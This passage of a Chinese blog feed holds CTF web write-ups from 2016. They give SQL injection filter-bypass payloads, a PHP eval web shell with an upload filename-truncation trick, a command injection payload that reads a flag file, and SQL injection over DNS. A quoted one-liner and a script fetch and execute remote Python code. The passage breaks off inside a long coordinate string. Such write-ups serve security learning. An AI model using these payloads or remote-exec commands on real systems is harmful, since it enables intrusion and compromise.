    $result = mysql_fetch_array(mysql_query("select qq from qq where qq like '$search'"));
    mysql_close();
    if($result){
        echo "&lt;center style=\"font-size:36px; color:red\"&gt;$result[qq]&lt;/center&gt;";
    }else{
        echo "&lt;center style=\"font-size:36px; color:red\"&gt;无此记录&lt;/center&gt;";
    }
}
?&gt;
</code></pre>
<p>根據MySQL的特性,like條件中<code>_</code>可以表示一個任意字符，多來幾次就成功查到了。（10位的QQ）</p>
<h2>0x03 繞過Fifter</h2>
<p>這道題目，百分之七十的代碼都是用來過濾的。Orz</p>
<pre><code>$sql = "select * from admin where username='$username' or id='$id' or email = '$email'";
$result = @mysql_fetch_array(mysql_query($sql));
mysql_close();
if ($result) {
    if (think_ucenter_md5($password, $result['salt']) === $result['password']) {
        $_SESSION['login'] = 1;
        $_SESSION['auth'] = 1;
</code></pre>
<p>目的就是以<code>$username</code>、<code>$id</code>、<code>$email</code>三個變量構造payload。</p>
<p>此處需要<code>union select</code>覆蓋<code>salt</code>和<code>password</code>。</p>
<p>你能想像到的特殊字符都給過濾了。</p>
<pre><code>if (strlen($username) &gt; 20) {
    $username = substr($username, 0, 20); 
}
</code></pre>
<p><code>addslashes()</code>轉義加<code>username</code>截斷可以逃逸一個引號。</p>
<pre><code>username = x*19%00
select * from admin where username='x*19\' or id='$id' or email = '$email'
</code></pre>
<p><code>id</code>處也做了處理</p>
<pre><code>$id=preg_replace('#[^\w\s]#i','',$id);
</code></pre>
<p>根據</p>
<pre><code>$check= preg_match('/select|\'|\"|,|%|insert|update|delete|union|into|load_file|outfile|or|\/\*/i', $str); 
if($check) { 
    exit ("The data is unable to submit,Because it contain dengerous string,Please check it and clear it.");
}

$newstr="";
while($newstr!=$str){
    $newstr=$str;
    $str = str_replace("union", "", $str);
    $str = str_replace("update", "", $str);
    $str = str_replace("into", "", $str);
    $str = str_replace("exec", "", $str);
    $str = str_replace("select", "", $str);
    $str = str_replace("delete", "", $str);
    $str = str_replace("declear"," ",$str);
    $str = str_replace("insert", "", $str);
}
</code></pre>
<p>成功在<code>id</code>注入<strong>or</strong></p>
<pre><code>id=oexecr
select * from admin where username='x*19\' or id='$id' or email = '$email'
select * from admin where username='x*19\' or id='or' or email = '$email'
</code></pre>
<p>最腦洞的是<code>email</code>的構造。</p>
<pre><code>if ($email &amp;&amp; !preg_match("/\A\w+[-+_]*\s?\w+@\w+\.\w{2,4}(\Z|\.\w{2,4})/", $email)) {  //允许输入 yu@qq.com || yu@qq.com.cn || yu_a@qq.com || yu-x@qq.com
    exit("Email Wrong!");
}
foreach ($_REQUEST as $key =&gt; $value){
    if (strpos($value, '(')) {
        $filter = "UNION.+?SELECT|SELECT.+?FROM|MD5|0x|\/\*|\.\.\/|\.\/";
        webscan_St0pAttack($key, $value, $filter, "GET");
    }
}
</code></pre>
<p>各種過濾傷腦，逗號 （<strong>,</strong>） 也過濾了。</p>
<p>首先，我們得先把<code>@xx.xx</code>的郵箱格式給注釋掉。正則中存在<code>[-+_]*</code>明顯是讓用<code>-- x</code>的形式注釋。</p>
<p>注釋之後的語句都無效了，那還怎麼union select？</p>
<p>別擔心，有黑科技！！！</p>
<p><strong>【黑科技 1 】</strong>
換行之後可以跳出注釋！payload：<strong>%0a</strong></p>
<p>這種<code>UNION.+?SELECT</code>也是利用<strong>%0a</strong>繞過！</p>
<p>另外，題目裏的過濾函數大多數是對大小寫敏感的，大小寫混寫就能繞過了。</p>
<p>比如，<code>Selexecect</code>什麼的！</p>
<p>然後、我麼需要fuzz出純數字的sha1密文，這個就需要自己跑了。</p>
<pre><code>function think_ucenter_md5($str, $key = 'ThinkUCenter')
{
    return '' === $str ? '' : md5(sha1($str) . $key);
}
</code></pre>
<p>跑出來結果，password=aaaaanvejr&amp;key=1的時候的sha1密文為86989721238789742522421481132813</p>
<pre><code>email=rlike-- a@abc.com.cn%0a1 oexecr id=8e0Unioexecn%0a(  Seexeclect*%0afrom((%0A%0ASeexeclect%2b1)a join (%0A%0ASeexeclect%2b1)b join (%0A%0ASeexeclect%2b1)c join (%0A%0ASeexeclect%2b86989721238789742522421481132813)d join (%0A%0ASeexeclect%2b1)e join (%0a%0aSeexeclect%2b1)f))%23

select * from admin where username='x*19\' or id='or' or email = 'rlike-- a@abc.com.cn
1 or id=8e0Unioexecn
(  Select*
from((

Select+1)a join (

Select+1)b join (
Select+1)c join (

Select+86989721238789742522421481132813)d join (

Select+1)e join (

Select+1)f))#'
</code></pre>
<p>成功突破!</p>
<pre><code>/login.php?act=login

id=oexecr
&amp;username=vvvvvvvvvvvvvvvvvvv%00
&amp;email=rlike-- a@abc.com.cn%0a1 oexecr id=8e0Unioexecn%0a(  Seexeclect*%0afrom((%0A%0ASeexeclect%2b1)a join (%0A%0ASeexeclect%2b1)b join (%0A%0ASeexeclect%2b1)c join (%0A%0ASeexeclect%2b86989721238789742522421481132813)d join (%0A%0ASeexeclect%2b1)e join (%0a%0aSeexeclect%2b1)f))%23
&amp;password=aaaaanvejr
&amp;submit=1
</code></pre>
<h2>0x04 上傳Shell</h2>
<p>PHP黑科技繞過<code>if (strpos($content, '&lt;?php'))</code></p>
<pre><code>&lt;script language=php&gt;@eval($_POST[1]);&lt;/script&gt;
</code></pre>
<p>PHP黑科技繞過<code>if (!getimagesize($file[tmp_name])) {</code></p>
<pre><code>GIF89a
</code></pre>
<p>還有更折騰人的</p>
<pre><code>    $destination_folder = './uploads/';
    $destination_folder .= date('Y', time()) . "/" . date('m', time()) . "/";
    if (!file_exists($destination_folder)) mkdir('./' . $destination_folder, 0777, true);
    $file_pre = md5(time());

    $realname = $file_pre . $filetype;
    $destination = $destination_folder . $realname;

    if (move_uploaded_file($file[tmp_name], $destination)) {
        $file[name] = addslashes($file[name]);
        mysql_query("Insert into files(filename,realname,path) values ('$file[name]','$realname','$destination_folder')");
        mysql_close();
        @unlink($_FILES['file']['tmp_name']);
        exit('Upload success');

    $result = @mysql_fetch_array(mysql_query("select * from files where filename = '$filename' and realname = '$realname'"));
    if(!empty($filename) &amp;&amp; !empty($realname)){
        if($result){
            if(rename($result[path].$result[realname],$result[path].$result[filename])){
                exit('rename success');
            }
        }else{
            exit('No the file where in the database');
        }
    }
</code></pre>
<p>上傳一個文件之後就碰撞<code>md5(time()).gif</code></p>
<p>然後就是想辦法截斷文件名達到<code>shell.php</code>的目的。</p>
<p>其實我覺得<code>$file[name] = addslashes($file[name]);</code>是關鍵、然而我沒本事利用。</p>
<p>本地測試環境的時候、發現，varchar的初始長度是255,會不會也是可以把文件名截斷。</p>
<p>於是就fuzz文件名長度，最後發現文件名長度為40個字符。</p>
<p>上傳 <code>v*36+.php.gif</code>文件就會被截斷成<code>v*36+.php</code></p>
<p>成功getshell！</p>
<p>flag在網站根目錄下的<code>ffffffffffffffffffffffffffffffffflag.txt</code>文件內！</p>
<p><strong>miao{f9ac7a86927fee51ec92cab4a895c33a}</strong></p>
<hr />
<p><strong>fuzzfilename.py</strong></p>
<pre><code>import hashlib, time, requests, sys

def vrename(abc):
    res = requests.get("http://xxx/sgbm/admin_yu_filemanage.php?motify=motify&amp;filename="+"v"*36+".php&amp;realname="+abc)
    if 'rename success' in res.content:
        print abc
        sys.exit(0)

def md5(src):
    a = hashlib.md5()
    a.update(str(src))
    return a.hexdigest()

if __name__ == '__main__':
    tt = int(time.time())
    for i in range(0,100):
        a = md5(tt) + '.gif'
        tt -= 1
        vrename(a)
</code></pre>]]></description>
</item>
<item>
<title><![CDATA[CCTF2016 web小记]]></title>
<pubDate>Sun, 24 Apr 2016 18:51:58 GMT</pubDate>
<link>http://www.virzz.com/2016_04_24_cctf2016_web_writeups</link>
<guid>http://www.virzz.com/2016_04_24_cctf2016_web_writeups</guid>
<description><![CDATA[<h2>0x00 死坑死坑的脑洞</h2>
<p>绝逼不能忍，出题人你出来，保证不打死你。。不知道AK的大神是什么样的大脑。</p>
<h2>0x01 LOLI1 &amp; LOLI2</h2>
<p>题目给了个网址 http://www.loli.club/</p>
<p>撸上去啥都没有。。另外、hint的颜色居然和背景色一样、提示找blog</p>
<p>看源码，有这样一段</p>
<pre><code>&lt;!--
powered by PockyNya
诚招前端，请联系邮箱：pocky@loli.club
--&gt;
</code></pre>
<p>各种误解，最后根据<strong>RicterZ</strong>的github<code>https://github.com/RicterZ</code>找到了<strong>PockyNya</strong>的Github<code>https://github.com/PockyNya</code></p>
<p>在PockyNya的Github里面有两个项目 <strong>minecraft-bot</strong> 和 <strong>pyprint</strong>。</p>
<p>进入<strong>pyprint</strong>就能看到PockyNya的Blog地址了。。我也是醉了</p>
<p>下载源码审计</p>
<pre><code>class AddPostHandler(BaseHandler):
    @tornado.web.authenticated
    def get(self):
        self.background_render('add_post.html', post=None)

    def post(self):
        title = self.get_argument('title', None)
        content = self.get_argument('content', None)
        tags = self.get_argument('tags', '').strip().split(',')
        if not title or not content:
            return self.redirect('/kamisama/posts/add')

        post = self.orm.query(Post.title).filter(Post.title == title).all()
        if post:
            return self.write('&lt;script&gt;alert("Title has already existed");window.history.go(-1);&lt;/script&gt;')
        self.orm.add(Post(title=title, content=content, created_time=date.today()))
        self.orm.commit()
        return self.redirect('/kamisama/posts')
</code></pre>
<p>发表文章居然不检查权限，立马来了一波XSS。。。分分钟拿到了在COOKIE的Flag。unhex就行了</p>
<p>Flag：<strong>CCTF{CODE_AUDIT_BUSTERS}</strong></p>
<p>然而这个Flag是Loli2的、、、、</p>
<p>继续看另一个项目<strong>minecraft-bot</strong></p>
<p>各种lua看不懂、、看介绍是一个Telegram的机器人。</p>
<p>根据项目名称，先看<strong>minecraft.lua</strong></p>
<pre><code>do

local function run(msg, matches)
  if matches[1] ~= '!minecraft' then
    operation = matches[1]
  else
    return "!minecraft start|stop|restart"
  end
  if string.find(operation, '&amp;') or string.find(operation, '|') or string.find(operation, '`') or string.find(operation, '%$') then
    return "Invalid operation " .. operation
  end
  local t = io.popen('cd /home/telegram &amp;&amp; ./mc ' .. operation)
  local a = t:read("*all")
  return a
end
</code></pre>
<p>虽然不是很懂，但勉强还是能看出来是命令注入漏洞。</p>
<p>过滤了&amp;、|、`、%$，然而还是可以用哪个;截断的。</p>
<p>Payload：<code>!minecraft x;cat /home/wwwroot/flag</code></p>
<p>get it !</p>
<p>Flag : <strong>CCTF{TELEGRAM_BOT_AND_Lf}</strong></p>
<h2>0x02 Loli3</h2>
<p>这个由于种种原因没做完、、</p>
<p>提示DNS。。。顺着线索扫到了ns.loli.club这个域名。。翻找大大的github发现<strong>fakeDNS</strong>的东西。</p>
<p>dns解析服务器。。Orz</p>
<p>各种不懂、后来看hint、python+mysql的。</p>
<p>瞬间想到了注入。</p>
<p>然而、由于某种不知名的原因、本地nslookup总是出错。</p>
<p>最后在一台vps上面成功注入。。然而这时候没时间了、、、、Orz</p>
<p>Payload：<code>nslookup -q=txt "' union select 1,user(),3,4 from mysql.user#" ns.loli.club</code></p>
<p>Result:</p>
<pre><code>Server:     ns.loli.club
Address:    120.27.149.210#53

Non-authoritative answer:
'\032union\032select\0321,user\(\),3,4\032from\032mysql.user#   text = "root@localhost"

Authoritative answers can be found from:
</code></pre>
<p>然后就木有了。。。</p>
<h2>0x03 IDS</h2>
<p><code>http://ids.c-chicken.cc/?id=1</code></p>
<p>随手检测、有注入、、sqlmap跑了下没效果。</p>
<p>第一个提示出来了，看返回头，同源限制什么的、感觉存在XSS，但是还不知道什么用</p>
<p>坐等hint、、重点在IDS。。</p>
<p>才发现我还没有扫目录、、出现了个upload.php</p>
<p>第二波hint出现、、还真是xss。检测记录会有管理员看。X管理员吧</p>
<p>注入有各种过滤，上传也是。</p>
<p>目测是上传js文件、script引用。或者是swf，xss。。。</p>
<p>后面就没有了.....</p>
<h2>0x04 没什么好说的。</h2>
<p>反正就是各种脑洞！博客写简单了，其中各种过程、各种丧心病狂的脑洞、、本人已疯！</p>]]></description>
</item>
<item>
<title><![CDATA[三种姿势秒破SYC招聘]]></title>
<pubDate>Wed, 13 Apr 2016 21:03:40 GMT</pubDate>
<link>http://www.virzz.com/2016_04_13_three_kinds_of_postures_seconds_to_fuck_the_syc_recruitment</link>
<guid>http://www.virzz.com/2016_04_13_three_kinds_of_postures_seconds_to_fuck_the_syc_recruitment</guid>
<description><![CDATA[<h1>三种姿势秒破SYC招聘</h1>
<h3>0x00 缘由</h3>
<p>四叶草某大牛(zhao)在SSCTF群里放了个链接
<a href="http://static.lab.seclover.com/page/2016/zp/index.html">http://static.lab.seclover.com/page/2016/zp/index.html</a>
曰：“有彩蛋，来玩玩，要是能找到特殊的彩蛋，或者关注公告号查看具体要求”</p>
<p>同时还放了个类似我的世界的游戏的截图</p>
<p>本着无聊撸一发的心情开始了这次的秒破行动</p>
<h3>0x01 GOGOGO~</h3>
<p>打开链接、很不错的一个js效果、自己看</p>
<p>根据<strong>seclover.jobs</strong>信息、点了个职业进去</p>
<p>一个伪shell操作界面，本能地输了个whoami，结果必然是返回错误、同时、并没有网络请求</p>
<p>ls列目录、成功、</p>
<p>然后，<code>cat info2.txt</code>得到</p>
<pre><code>python -c "exec(__import__('urllib2').urlopen('http://t.cn/RqJK3Tt').read())"
</code></pre>
<p>正如截图所示的进入游戏的命令，链接很可疑~~</p>
<h3>0x02 第一种姿势，Big Bug 1</h3>
<p>果断打开了游戏，pyglet框架的一个小游戏。</p>
<p>本打算先玩一下的、然而一个Big Bug出现了、、输入不过滤、、用着拼音输入法输入了一串方向操作字符、、Orz，结果卡住了、、无限倒退、、</p>
<p>然后各种测试想让它停下来、、结果发现Tab键是上帝模式，结果倒退着飞到了天花板、、</p>
<p>这尼玛天花板居然是岩石、、、笼中的世界啊</p>
<p>再然后就、、、、没有然后了</p>
<p>穿墙飞出去了、、、Orz</p>
<p>然后就看到了所谓的彩蛋</p>
<p>经过一番测试、一直往墙上走、运气好就会穿墙而出，这似乎是一个BUG</p>
<h3>第二种姿势，地底通道</h3>
<p>估计这个是真正的彩蛋了</p>
<p>在初始位置、往地下打洞、、然后就穿透了、、掉到一块悬空草地上面、开启上帝模式、飞啊飞就好了</p>
<h3>第三种姿势</h3>
<p>果断访问 <a href="http://t.cn/RqJK3Tt">http://t.cn/RqJK3Tt</a></p>
<p>得到真正地址<a href="http://7xlbug.com1.z0.glb.clouddn.com/main.py">http://7xlbug.com1.z0.glb.clouddn.com/main.py</a></p>
<pre><code>import imp
DEBUG = False
if imp.get_magic() != '\x03\xf3\r\n':
    print "Please update to Python 2.7 (http://www.python.org/download/)"
    exit()

import urllib, marshal
print "Please wait..."
H = "7xlbug.com1.z0.glb.clouddn.com"
if DEBUG:
    exec marshal.loads(open('init.pyh','rb').read())
else:
    exec marshal.loads(urllib.urlopen("http://%s/init.pyh" % H).read())
print "Game end!"
</code></pre>
<p>再打开<a href="http://7xlbug.com1.z0.glb.clouddn.com/init.pyh">http://7xlbug.com1.z0.glb.clouddn.com/init.pyh</a></p>
<p>阅读凌乱的代码、得到<code>game.pyh</code></p>
<p>继续打开<a href="http://7xlbug.com1.z0.glb.clouddn.com/game.pyh">http://7xlbug.com1.z0.glb.clouddn.com/game.pyh</a></p>
<p>得到一堆疑似坐标的字符串<strong>TextureGroup</strong>、处理掉乱七八糟的字符</p>
<p>然后用python画出图片、get it！</p>
<pre><code>#!/usr/bin/env python
# __author__ : Virink

from PIL import Image

data = '3,1s7,1s12,1s13,1s14,1s15,1s16,1s17,1s18,1s19,1s20,1s21,1s22,1s27,1s29,1s48,1s52,1s56,1s60,1s61,1s62,1s63,1s65,1s66,1s67,1s68,1s69,1s72,1s73,1s74,1s79,1s84,1s85,1s86,1s87,1s88,1s89,1s90,1s91,1s92,1s93,1s94,1s1,2s2,2s3,2s4,2s5,2s6,2s7,2s8,2s9,2s17,2s26,2s29,2s30,2s31,2s32,2s33,2s34,2s48,2s52,2s62,2s65,2s69,2s74,2s79,2s81,2s84,2s88,2s94,2s3,3s7,3s13,3s14,3s15,3s16,3s17,3s18,3s19,3s20,3s21,3s26,3s29,3s34,3s48,3s49,3s50,3s51,3s52,3s53,3s54,3s55,3s56,3s57,3s58,3s62,3s65,3s67,3s69,3s74,3s81,3s89,3s91,3s1,4s2,4s3,4s4,4s5,4s6,4s7,4s8,4s9,4s10,4s25,4s26,4s28,4s31,4s33,4s51,4s62,4s65,4s67,4s69,4s72,4s73,4s74,4s75,4s76,4s78,4s81,4s85,4s87,4s90,4s93,4s3,5s7,5s13,5s14,5s15,5s16,5s17,5s18,5s19,5s20,5s21,5s24,5s26,5s31,5s51,5s60,5s61,5s62,5s63,5s65,5s67,5s69,5s74,5s76,5s78,5s80,5s82,5s85,5s87,5s89,5s92,5s94,5s2,6s4,6s8,6s13,6s21,6s26,6s29,6s31,6s33,6s38,6s39,6s51,6s52,6s53,6s54,6s55,6s56,6s62,6s65,6s67,6s69,6s73,6s74,6s76,6s78,6s80,6s82,6s84,6s88,6s89,6s90,6s91,6s92,6s94,6s1,7s4,7s9,7s13,7s14,7s15,7s16,7s17,7s18,7s19,7s20,7s21,7s26,7s29,7s31,7s34,7s38,7s39,7s50,7s52,7s56,7s62,7s65,7s67,7s69,7s73,7s74,7s75,7s78,7s79,7s82,7s86,7s87,7s4,8s5,8s7,8s10,8s14,8s20,8s26,8s29,8s31,8s34,8s39,8s50,8s53,8s55,8s62,8s66,8s68,8s72,8s74,8s78,8s89,8s2,9s4,9s6,9s8,9s12,9s13,9s14,9s15,9s16,9s17,9s18,9s19,9s20,9s21,9s22,9s26,9s28,9s31,9s34,9s38,9s49,9s54,9s62,9s63,9s66,9s68,9s74,9s77,9s78,9s81,9s85,9s89,9s93,9s1,10s4,10s6,10s8,10s13,10s21,10s26,10s31,10s48,10s52,10s53,10s55,10s56,10s60,10s61,10s65,10s68,10s70,10s74,10s76,10s78,10s81,10s85,10s89,10s93,10s3,11s4,11s13,11s14,11s15,11s16,11s17,11s18,11s19,11s20,11s21,11s26,11s30,11s31,11s50,11s51,11s57,11s58,11s64,11s69,11s70,11s74,11s75,11s79,11s80,11s81,11s85,11s86,11s87,11s88,11s89,11s90,11s91,11s92,11s93,11s1,16s6,16s28,16s31,16s36,16s40,16s44,16s1,17s2,17s3,17s4,17s6,17s7,17s8,17s9,17s10,17s13,17s14,17s15,17s16,17s17,17s18,17s19,17s20,17s21,17s22,17s24,17s28,17s32,17s37,17s41,17s43,17s48,17s49,17s50,17s51,17s52,17s53,17s54,17s55,17s56,17s57,17s58,17s3,18s5,18s8,18s13,18s17,18s24,18s28,18s52,18s1,19s4,19s5,19s6,19s7,19s8,19s9,19s13,19s17,19s24,19s25,19s26,19s27,19s28,19s29,19s30,19s31,19s32,19s33,19s34,19s39,19s40,19s41,19s42,19s43,19s44,19s45,19s51,19s55,19s2,20s9,20s13,20s15,20s16,20s17,20s18,20s19,20s20,20s21,20s27,20s36,20s37,20s42,20s50,20s56,20s3,21s4,21s5,21s6,21s7,21s9,21s13,21s17,21s21,21s27,21s37,21s42,21s49,21s50,21s51,21s52,21s53,21s54,21s55,21s56,21s57,21s1,22s3,22s7,22s9,22s13,22s17,22s21,22s27,22s28,22s29,22s30,22s31,22s32,22s37,22s38,22s39,22s40,22s41,22s42,22s43,22s44,22s45,22s46,22s53,22s57,22s1,23s3,23s4,23s5,23s6,23s7,23s9,23s13,23s17,23s21,23s26,23s28,23s32,23s37,23s42,23s53,23s1,24s3,24s7,24s9,24s13,24s16,24s21,24s26,24s29,24s31,24s37,24s41,24s43,24s49,24s50,24s51,24s52,24s53,24s54,24s55,24s56,24s57,24s1,25s3,25s4,25s5,25s6,25s7,25s9,25s13,25s16,25s21,25s25,25s30,25s37,25s40,25s44,25s53,25s1,26s9,26s13,26s15,26s21,26s24,26s28,26s29,26s31,26s32,26s37,26s39,26s45,26s53,26s1,27s7,27s8,27s9,27s12,27s14,27s18,27s19,27s20,27s26,27s27,27s33,27s34,27s36,27s38,27s39,27s40,27s41,27s42,27s43,27s44,27s45,27s46,27s48,27s49,27s50,27s51,27s52,27s53,27s54,27s55,27s56,27s57,27s58,27s6,33s7,33s38,33s90,33s91,33s92,33s7,34s38,34s68,34s69,34s70,34s92,34s7,35s67,35s71,35s92,35s7,36s66,36s69,36s71,36s92,36s1,37s2,37s3,37s4,37s7,37s8,37s9,37s14,37s15,37s20,37s21,37s24,37s25,37s26,37s27,37s32,37s33,37s37,37s38,37s42,37s43,37s46,37s47,37s48,37s49,37s51,37s52,37s56,37s57,37s60,37s61,37s62,37s63,37s66,37s68,37s69,37s71,37s73,37s74,37s75,37s76,37s80,37s81,37s86,37s87,37s88,37s92,37s98,37s99,37s102,37s103,37s105,37s106,37s110,37s111,37s114,37s115,37s117,37s118,37s128,37s129,37s130,37s134,37s135,37s138,37s139,37s140,37s141,37s3,38s7,38s10,38s13,38s16,38s19,38s22,38s25,38s28,38s31,38s34,38s38,38s43,38s46,38s49,38s52,38s55,38s58,38s61,38s64,38s66,38s68,38s69,38s71,38s73,38s79,38s82,38s85,38s88,38s92,38s97,38s100,38s103,38s105,38s109,38s112,38s115,38s116,38s127,38s130,38s133,38s136,38s138,38s140,38s142,38s2,39s7,39s10,39s14,39s15,39s16,39s19,39s22,39s25,39s28,39s31,39s32,39s33,39s34,39s38,39s43,39s46,39s49,39s52,39s56,39s57,39s58,39s61,39s64,39s66,39s68,39s69,39s70,39s74,39s75,39s79,39s80,39s81,39s82,39s85,39s92,39s97,39s100,39s103,39s105,39s109,39s110,39s111,39s112,39s115,39s127,39s133,39s136,39s138,39s140,39s142,39s2,40s7,40s10,40s13,40s16,40s19,40s22,40s25,40s28,40s31,40s38,40s44,40s45,40s49,40s52,40s55,40s58,40s61,40s64,40s67,40s71,40s76,40s79,40s85,40s88,40s92,40s97,40s100,40s104,40s109,40s115,40s127,40s130,40s133,40s136,40s138,40s140,40s142,40s1,41s2,41s3,41s4,41s6,41s7,41s8,41s10,41s11,41s14,41s15,41s16,41s17,41s20,41s21,41s25,41s26,41s27,41s32,41s33,41s34,41s37,41s38,41s39,41s45,41s50,41s51,41s52,41s53,41s56,41s57,41s58,41s59,41s60,41s61,41s62,41s64,41s65,41s68,41s69,41s70,41s73,41s74,41s75,41s76,41s80,41s81,41s82,41s86,41s87,41s90,41s91,41s92,41s93,41s94,41s98,41s99,41s104,41s110,41s111,41s112,41s114,41s115,41s116,41s121,41s128,41s129,41s134,41s135,41s138,41s140,41s142,41s25,42s44,42s24,43s25,43s26,43s42,43s43,43s5,48s12,48s13,48s14,48s15,48s16,48s18,48s19,48s20,48s21,48s22,48s65,48s73,48s78,48s86,48s6,49s12,49s16,49s18,49s22,49s42,49s43,49s65,49s74,49s78,49s86,49s89,49s90,49s91,49s92,49s93,49s1,50s12,50s16,50s18,50s22,50s43,50s65,50s78,50s86,50s93,50s3,51s4,51s5,51s6,51s7,51s8,51s9,51s12,51s16,51s18,51s19,51s20,51s21,51s22,51s38,51s43,51s65,51s75,51s76,51s77,51s78,51s79,51s80,51s81,51s84,51s85,51s86,51s87,51s88,51s92,51s6,52s12,52s13,52s14,52s15,52s16,52s18,52s22,52s38,52s43,52s60,52s61,52s62,52s63,52s64,52s65,52s66,52s67,52s68,52s69,52s70,52s72,52s78,52s85,52s88,52s91,52s6,53s12,53s16,53s18,53s22,53s24,53s25,53s26,53s27,53s30,53s31,53s34,53s35,53s37,53s38,53s39,53s40,53s43,53s44,53s45,53s50,53s51,53s54,53s55,53s56,53s57,53s65,53s73,53s78,53s85,53s88,53s91,53s1,54s6,54s12,54s16,54s18,54s19,54s20,54s21,54s22,54s25,54s28,54s31,54s34,54s38,54s43,54s46,54s49,54s52,54s55,54s58,54s64,54s66,54s74,54s75,54s76,54s77,54s78,54s79,54s80,54s81,54s82,54s85,54s88,54s89,54s90,54s91,54s92,54s93,54s94,54s3,55s4,55s5,55s6,55s7,55s8,55s9,55s12,55s16,55s18,55s22,55s25,55s28,55s31,55s34,55s38,55s43,55s46,55s49,55s52,55s55,55s58,55s64,55s66,55s77,55s84,55s87,55s91,55s6,56s12,56s13,56s14,56s15,56s16,56s18,56s22,56s25,56s28,56s32,56s33,56s38,56s43,56s46,56s49,56s52,56s55,56s58,56s63,56s67,56s74,56s77,56s80,56s85,56s87,56s91,56s1,57s6,57s12,57s18,57s22,57s25,57s26,57s27,57s33,57s38,57s39,57s40,57s42,57s43,57s44,57s46,57s47,57s50,57s51,57s54,57s55,57s56,57s58,57s59,57s63,57s67,57s73,57s76,57s81,57s86,57s91,57s6,58s17,58s22,58s25,58s32,58s62,58s68,58s72,58s75,58s76,58s77,58s78,58s79,58s80,58s81,58s82,58s85,58s87,58s91,58s2,59s3,59s4,59s5,59s6,59s7,59s8,59s9,59s10,59s16,59s20,59s21,59s22,59s24,59s25,59s26,59s30,59s31,59s60,59s61,59s69,59s70,59s82,59s84,59s88,59s90,59s91,59s7,64s9,64s24,64s31,64s33,64s41,64s80,64s1,65s7,65s10,65s16,65s25,65s31,65s34,65s40,65s42,65s62,65s69,65s70,65s80,65s83,65s84,65s85,65s86,65s87,65s3,66s4,66s5,66s6,66s7,66s8,66s9,66s10,66s17,66s27,66s28,66s29,66s30,66s31,66s32,66s33,66s34,66s39,66s43,66s50,66s51,66s52,66s62,66s70,66s80,66s87,66s3,67s7,67s18,67s27,67s31,67s38,67s40,67s44,67s49,67s52,67s70,67s78,67s79,67s80,67s81,67s82,67s86,67s1,68s3,68s7,68s15,68s18,68s24,68s25,68s27,68s31,68s36,68s37,68s41,68s45,68s46,68s48,68s70,68s79,68s82,68s85,68s1,69s3,69s4,69s5,69s6,69s8,69s10,69s15,69s21,69s25,69s27,69s28,69s29,69s30,69s32,69s34,69s38,69s39,69s40,69s41,69s42,69s43,69s48,69s54,69s55,69s57,69s58,69s61,69s62,69s68,69s69,69s70,69s74,69s75,69s79,69s82,69s85,69s1,70s3,70s6,70s8,70s10,70s13,70s15,70s22,70s25,70s27,70s30,70s32,70s34,70s43,70s48,70s51,70s52,70s53,70s55,70s58,70s62,70s67,70s70,70s73,70s76,70s79,70s82,70s83,70s84,70s85,70s86,70s87,70s88,70s1,71s3,71s6,71s8,71s9,71s13,71s15,71s22,71s25,71s27,71s30,71s32,71s33,71s42,71s48,71s52,71s55,71s58,71s62,71s67,71s70,71s73,71s76,71s78,71s81,71s85,71s1,72s3,72s6,72s8,72s13,72s15,72s22,72s25,72s27,72s30,72s32,72s41,72s45,72s49,72s52,72s55,72s58,72s62,72s67,72s70,72s73,72s76,72s79,72s81,72s85,72s1,73s2,73s3,73s5,73s6,73s8,73s10,73s12,73s15,73s20,73s25,73s26,73s27,73s29,73s30,73s32,73s34,73s37,73s39,73s42,73s46,73s50,73s51,73s56,73s57,73s58,73s59,73s61,73s62,73s63,73s68,73s69,73s70,73s71,73s74,73s75,73s80,73s85,73s1,74s3,74s7,74s9,74s10,74s15,74s20,74s25,74s27,74s31,74s33,74s34,74s37,74s39,74s44,74s46,74s79,74s81,74s85,74s2,75s6,75s10,75s16,75s17,75s18,75s19,75s20,75s26,75s30,75s34,75s36,75s40,75s41,75s42,75s43,75s44,75s78,75s82,75s84,75s85,75s47,80s55,80s60,80s69,80s94,80s24,81s25,81s47,81s56,81s60,81s69,81s71,81s72,81s73,81s74,81s75,81s79,81s80,81s81,81s82,81s83,81s84,81s85,81s86,81s87,81s95,81s6,82s7,82s8,82s9,82s25,82s47,82s60,82s68,82s71,82s75,82s83,82s90,82s91,82s92,82s93,82s94,82s95,82s96,82s97,82s98,82s99,82s100,82s7,83s10,83s20,83s25,83s47,83s57,83s58,83s59,83s60,83s61,83s62,83s63,83s68,83s71,83s75,83s79,83s83,83s87,83s90,83s94,83s100,83s7,84s10,84s20,84s25,84s42,84s43,84s44,84s45,84s46,84s47,84s48,84s49,84s50,84s51,84s52,84s54,84s60,84s67,84s68,84s71,84s72,84s73,84s74,84s75,84s80,84s83,84s87,84s94,84s7,85s8,85s9,85s12,85s13,85s16,85s17,85s19,85s20,85s21,85s22,85s25,85s26,85s27,85s32,85s33,85s36,85s37,85s38,85s39,85s47,85s55,85s60,85s66,85s68,85s73,85s80,85s83,85s86,85s90,85s91,85s92,85s93,85s94,85s95,85s96,85s97,85s98,85s99,85s100,85s7,86s13,86s16,86s20,86s25,86s28,86s31,86s34,86s37,86s40,86s46,86s48,86s56,86s57,86s58,86s59,86s60,86s61,86s62,86s63,86s64,86s68,86s70,86s71,86s72,86s73,86s74,86s75,86s76,86s83,86s93,86s98,86s7,87s13,87s16,87s20,87s25,87s28,87s31,87s34,87s37,87s40,87s46,87s48,87s59,87s68,87s73,87s78,87s79,87s80,87s81,87s82,87s83,87s84,87s85,87s86,87s87,87s88,87s92,87s98,87s7,88s14,88s15,88s20,88s25,88s28,88s31,88s34,88s37,88s40,88s45,88s49,88s56,88s59,88s62,88s68,88s72,88s73,88s74,88s83,88s92,88s93,88s94,88s97,88s6,89s7,89s8,89s15,89s20,89s21,89s22,89s24,89s25,89s26,89s28,89s29,89s32,89s33,89s36,89s37,89s38,89s40,89s41,89s45,89s49,89s55,89s58,89s63,89s68,89s71,89s73,89s75,89s83,89s95,89s96,89s14,90s44,90s50,90s54,90s57,90s58,90s59,90s60,90s61,90s62,90s63,90s64,90s68,90s70,90s73,90s76,90s83,90s93,90s94,90s97,90s98,90s12,91s13,91s42,91s43,91s51,91s52,91s64,91s68,91s73,91s83,91s90,91s91,91s92,91s99,91s5,96s17,96s26,96s38,96s39,96s40,96s41,96s42,96s43,96s44,96s54,96s64,96s65,96s66,96s67,96s68,96s69,96s77,96s5,97s14,97s17,97s26,97s29,97s31,97s32,97s33,97s34,97s38,97s44,97s50,97s54,97s60,97s61,97s62,97s63,97s69,97s77,97s4,98s6,98s14,98s17,98s25,98s26,98s27,98s29,98s31,98s34,98s38,98s39,98s40,98s41,98s42,98s43,98s44,98s51,98s54,98s62,